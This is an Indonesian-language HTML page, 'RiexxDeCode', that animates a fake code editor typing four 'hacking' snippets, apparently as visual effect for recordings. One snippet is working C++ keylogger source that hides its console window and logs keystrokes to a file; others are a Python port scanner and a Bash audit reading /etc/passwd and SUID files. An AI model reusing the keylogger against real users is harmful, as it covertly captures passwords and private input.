<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RiexxDeCode</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'JetBrains Mono', monospace;
            background-color: #0a0e14;
            color: #f8f8f2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            padding: 20px;
        }

        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(25, 35, 60, 0.3) 1px, transparent 1px),
                linear-gradient(90deg, rgba(25, 35, 60, 0.3) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: -1;
            pointer-events: none;
        }

        .container {
            width: 100%;
            max-width: 900px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
            position: relative;
        }

        .logo h1 {
            font-size: 3.5rem;
            font-weight: 700;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: transparent;
            background: linear-gradient(45deg, #7e57c2, #29b6f6, #7e57c2);
            -webkit-background-clip: text;
            background-clip: text;
            text-shadow: 0 0 10px rgba(126, 87, 194, 0.5);
            animation: glow 3s infinite alternate;
        }

        @keyframes glow {
            0% {
                text-shadow: 0 0 10px rgba(126, 87, 194, 0.5);
            }
            100% {
                text-shadow: 0 0 20px rgba(41, 182, 246, 0.8), 0 0 30px rgba(41, 182, 246, 0.6);
            }
        }

        .code-editor {
            background-color: #1a1f29;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 25px rgba(126, 87, 194, 0.4);
            position: relative;
            overflow: hidden;
            text-align: left;
        }

        .editor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            background: #151a22;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            margin: -20px -20px 20px -20px;
        }

        .window-controls {
            display: flex;
        }

        .control {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .control.close {
            background-color: #ff5f56;
        }

        .control.minimize {
            background-color: #ffbd2e;
        }

        .control.maximize {
            background-color: #27c93f;
        }

        .editor-title {
            font-size: 0.9rem;
            color: #79b6f2;
        }

        .code-container {
            position: relative;
        }

        .line-numbers {
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            padding: 0 10px 0 5px;
            text-align: right;
            color: #6e7891;
            user-select: none;
            border-right: 1px solid #2f3542;
        }

        .code-content {
            margin-left: 40px;
            min-height: 300px;
            white-space: pre-wrap;
            overflow: hidden;
            font-size: 0.95rem;
            line-height: 1.5;
            tab-size: 4;
            -moz-tab-size: 4;
        }

        .code-content .keyword {
            color: #ff79c6;
        }

        .code-content .function {
            color: #50fa7b;
        }

        .code-content .string {
            color: #f1fa8c;
        }

        .code-content .comment {
            color: #6272a4;
        }

        .code-content .number {
            color: #bd93f9;
        }

        .code-content .operator {
            color: #ff79c6;
        }

        .code-content .class {
            color: #8be9fd;
        }

        .cursor {
            display: inline-block;
            width: 8px;
            height: 18px;
            background-color: #f8f8f2;
            animation: blink 1s infinite;
            vertical-align: middle;
            margin-left: 2px;
        }

        @keyframes blink {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0;
            }
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 15px;
            padding: 8px 15px;
            background: #151a22;
            border-bottom-left-radius: 8px;
            border-bottom-right-radius: 8px;
            font-size: 0.8rem;
            color: #79b6f2;
        }

        .language-indicator {
            display: flex;
            align-items: center;
        }

        .language-indicator::before {
            content: "";
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
            background-color: #50fa7b;
        }

        @media (max-width: 768px) {
            .logo h1 {
                font-size: 2.5rem;
            }
            
            .code-content {
                font-size: 0.85rem;
            }
        }

        @media (max-width: 480px) {
            .logo h1 {
                font-size: 2rem;
            }
            
            .editor-header {
                flex-direction: column;
                gap: 10px;
            }
            
            .code-content {
                margin-left: 30px;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    
    <div class="container">
        <div class="logo">
            <h1>RiexxDeCode</h1>
        </div>
        
        <div class="code-editor">
            <div class="editor-header">
                <div class="window-controls">
                    <div class="control close"></div>
                    <div class="control minimize"></div>
                    <div class="control maximize"></div>
                </div>
                <div class="editor-title">hack_script.js</div>
            </div>
            
            <div class="code-container">
                <div class="line-numbers">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20</div>
                <div class="code-content" id="codeDisplay"><span class="cursor"></span></div>
            </div>
            
            <div class="status-bar">
                <div class="language-indicator">JavaScript</div>
                <div class="line-info">Ln 1, Col 1</div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log("RiexxDeCode dimuat. Memulai efek auto typing...");
            
            const codeDisplay = document.getElementById('codeDisplay');
            const lineInfo = document.querySelector('.line-info');
            const languageIndicator = document.querySelector('.language-indicator');
            const editorTitle = document.querySelector('.editor-title');
            
            // Koleksi snippet kode dari berbagai bahasa
            const codeSnippets = [
                {
                    language: 'JavaScript',
                    code: `// Hacking tool untuk scanning jaringan\nfunction scanNetwork(ipRange) {\n  console.log("Memulai scan jaringan...");\n  \n  // Simulasi scanning\n  for (let i = 1; i <= 10; i++) {\n    const ip = ipRange + i;\n    console.log(\"Scanning IP: \" + ip);\n    \n    // Simulasi delay scanning\n    simulateDelay(100);\n  }\n  \n  return ["192.168.1.1", "192.168.1.5", "192.168.1.12"];\n}\n\n// Enkripsi data sensitif\nfunction encryptData(data, key) {\n  let result = "";\n  for (let i = 0; i < data.length; i++) {\n    const charCode = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);\n    result += String.fromCharCode(charCode);\n  }\n  return btoa(result);\n}`,
                    fileName: 'hack_script.js'
                },
                {
                    language: 'Python',
                    code: `# Script untuk penetration testing\nimport socket\nimport sys\nfrom threading import Thread\n\ndef port_scanner(target, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target, port))\n        if result == 0:\n            print(f"Port {port}: TERBUKA")\n        sock.close()\n    except Exception as e:\n        print(f"Error scanning port {port}: {e}")\n\n# Main execution\nif __name__ == "__main__":\n    target = "192.168.1.1"\n    print(f"Memulai scan pada {target}")\n    \n    # Scan port umum\n    for port in [21, 22, 23, 25, 53, 80, 443, 3389]:\n        Thread(target=port_scanner, args=(target, port)).start()`,
                    fileName: 'pen_test.py'
                },
                {
                    language: 'C++',
                    code: `// Keylogger sederhana (hanya untuk edukasi)\n#include <iostream>\n#include <fstream>\n#include <windows.h>\n\nusing namespace std;\n\nvoid stealth() {\n    HWND stealth;\n    AllocConsole();\n    stealth = FindWindowA("ConsoleWindowClass", NULL);\n    ShowWindow(stealth, 0);\n}\n\nint main() {\n    stealth();\n    char c;\n    \n    ofstream logfile;\n    logfile.open("log.txt", ios::app);\n    \n    while (1) {\n        for (c = 8; c <= 222; c++) {\n            if (GetAsyncKeyState(c) == -32767) {\n                logfile << c;\n            }\n        }\n    }\n    \n    logfile.close();\n    return 0;\n}`,
                    fileName: 'keylogger.cpp'
                },
                {
                    language: 'Bash',
                    code: `#!/bin/bash\n\n# Script untuk audit keamanan sistem\necho "Memulai audit keamanan sistem...\"\necho \"================================\"\n\n# Cek user dengan akses root\necho \"[+] User dengan akses root:\"\nawk -F: '($3 == \"0\") {print}' /etc/passwd\n\n# Cek service yang berjalan\necho -e \"\\n[+] Service yang berjalan:\"\nnetstat -tulpn | grep LISTEN\n\n# Cek file dengan SUID bit set\necho -e \"\\n[+] File dengan SUID bit:\"\nfind / -type f -perm -4000 2>/dev/null\n\n# Cek update keamanan yang tersedia\necho -e \"\\n[+] Update keamanan yang tersedia:\"\napt list --upgradable | grep -i security`,
                    fileName: 'security_audit.sh'
                }
            ];
            
            let currentSnippetIndex = 0;
            let currentCharIndex = 0;
            let currentLine = 1;
            let currentCol = 1;
            let isDeleting = false;
            
            // KECEPATAN NORMAL-AGAK LAMBAT (cocok untuk recording)
            let typingSpeed = 70;        // 70ms per karakter (normal-agak lambat)
            let deletingSpeed = 35;      // 35ms per karakter (normal-agak lambat)
            let pauseBetweenSnippets = 2000; // 2 detik jeda antar snippet
            
            function updateLineInfo() {
                lineInfo.textContent = `Ln ${currentLine}, Col ${currentCol}`;
            }
            
            function highlightCode(code) {
                // Fungsi sederhana untuk syntax highlighting
                return code
                    .replace(/(\/\/.*|\/\*[\s\S]*?\*\/)/g, '<span class="comment">$1</span>') // Komentar
                    .replace(/(function|def|class|if|else|for|while|return|const|let|var|import|include|echo|print)/g, '<span class="keyword">$1</span>') // Keyword
                    .replace(/([a-zA-Z_][a-zA-Z0-9_]*\()/g, '<span class="function">$1</span>') // Fungsi
                    .replace(/(".*?"|'.*?')/g, '<span class="string">$1</span>') // String
                    .replace(/\b(\d+)\b/g, '<span class="number">$1</span>') // Angka
                    .replace(/(\+|\-|\*|\/|%|&lt;|&gt;|=|!|&)/g, '<span class="operator">$1</span>') // Operator
                    .replace(/(class|interface|struct)\s+([a-zA-Z_][a-zA-Z0-9_]*)/g, '$1 <span class="class">$2</span>'); // Nama class
            }
            
            function typeCode() {
                const currentSnippet = codeSnippets[currentSnippetIndex];
                
                if (!isDeleting && currentCharIndex <= currentSnippet.code.length) {
                    // Mode mengetik
                    const typedText = currentSnippet.code.substring(0, currentCharIndex);
                    codeDisplay.innerHTML = highlightCode(typedText) + '<span class="cursor"></span>';
                    
                    // Update line dan column
                    const lines = typedText.split('\n');
                    currentLine = lines.length;
                    currentCol = lines[lines.length - 1].length + 1;
                    updateLineInfo();
                    
                    currentCharIndex++;
                    setTimeout(typeCode, typingSpeed);
                } else if (isDeleting && currentCharIndex >= 0) {
                    // Mode menghapus
                    const typedText = currentSnippet.code.substring(0, currentCharIndex);
                    codeDisplay.innerHTML = highlightCode(typedText) + '<span class="cursor"></span>';
                    
                    // Update line dan column
                    const lines = typedText.split('\n');
                    currentLine = lines.length;
                    currentCol = lines[lines.length - 1].length + 1;
                    updateLineInfo();
                    
                    currentCharIndex--;
                    setTimeout(typeCode, deletingSpeed);
                } else if (!isDeleting && currentCharIndex > currentSnippet.code.length) {
                    // Selesai mengetik, jeda sebelum menghapus
                    isDeleting = true;
                    setTimeout(typeCode, pauseBetweenSnippets);
                } else {
                    // Selesai menghapus, pindah ke snippet berikutnya
                    isDeleting = false;
                    currentSnippetIndex = (currentSnippetIndex + 1) % codeSnippets.length;
                    
                    // Update info bahasa dan nama file
                    languageIndicator.textContent = codeSnippets[currentSnippetIndex].language;
                    editorTitle.textContent = codeSnippets[currentSnippetIndex].fileName;
                    
                    // Sesuaikan jumlah line numbers
                    const lineCount = codeSnippets[currentSnippetIndex].code.split('\n').length;
                    const lineNumbersElement = document.querySelector('.line-numbers');
                    lineNumbersElement.innerHTML = Array.from({length: lineCount}, (_, i) => i + 1).join('<br>');
                    
                    setTimeout(typeCode, typingSpeed);
                }
            }
            
            // Mulai efek auto typing
            setTimeout(typeCode, 1000);
            
            // Update line numbers sesuai dengan snippet pertama
            const initialLineCount = codeSnippets[0].code.split('\n').length;
            const lineNumbersElement = document.querySelector('.line-numbers');
            lineNumbersElement.innerHTML = Array.from({length: initialLineCount}, (_, i) => i + 1).join('<br>');
            
            // Set info bahasa dan nama file awal
            languageIndicator.textContent = codeSnippets[0].language;
            editorTitle.textContent = codeSnippets[0].fileName;
        });
    </script>
</body>
</html>
